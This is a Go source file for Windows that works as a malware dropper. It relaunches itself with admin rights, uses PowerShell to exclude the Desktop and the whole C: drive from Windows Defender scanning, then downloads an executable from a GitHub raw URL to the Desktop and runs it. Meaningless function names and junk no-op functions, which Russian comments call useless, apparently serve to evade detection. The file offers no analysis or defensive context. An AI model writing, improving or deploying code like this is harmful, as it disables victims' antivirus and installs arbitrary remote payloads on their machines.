package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows"
)

func xyzabc() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

func qwerty() {
	action := "runas"
	executable, _ := os.Executable()
	currentDir, _ := os.Getwd()
	arguments := strings.Join(os.Args[1:], " ")

	actionPtr, _ := windows.UTF16PtrFromString(action)
	exePtr, _ := windows.UTF16PtrFromString(executable)
	dirPtr, _ := windows.UTF16PtrFromString(currentDir)
	argsPtr, _ := windows.UTF16PtrFromString(arguments)

	var showWindow int32 = 1 // SW_NORMAL

	windows.ShellExecute(0, actionPtr, exePtr, argsPtr, dirPtr, showWindow)
}

func asdfg(path string) error {
	cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Add-MpPreference -ExclusionPath '%s'", path))
	return cmd.Run()
}

func zxcvb(url, filePath string) error {
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	_, err = io.Copy(file, response.Body)
	return err
}

// Новые бесполезные функции
func nopqrs() {
	for i := 0; i < 3; i++ {
		fmt.Println("    ")
	}
}

func tuvwxy() {
	_ = strings.ToUpper("noop")
}

func zabcd() {
	_ = strings.ToLower("NOOP")
}

func main() {
	if !xyzabc() {
		qwerty()
		return
	}

	userDesktop := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
	systemDrive := "C:\\"

	asdfg(userDesktop)
	asdfg(systemDrive)

	time.Sleep(3 * time.Second)

	fileURL := "https://github.com/MrBrounr/main/raw/main/hawernus.exe" // Прямая ссылка на файл
	fileName := "gath.exe"
	savePath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop", fileName)

	zxcvb(fileURL, savePath)
	exec.Command(savePath).Start()

	// Вызов новых бесполезных функций
	nopqrs()
	tuvwxy()
	zabcd()
}
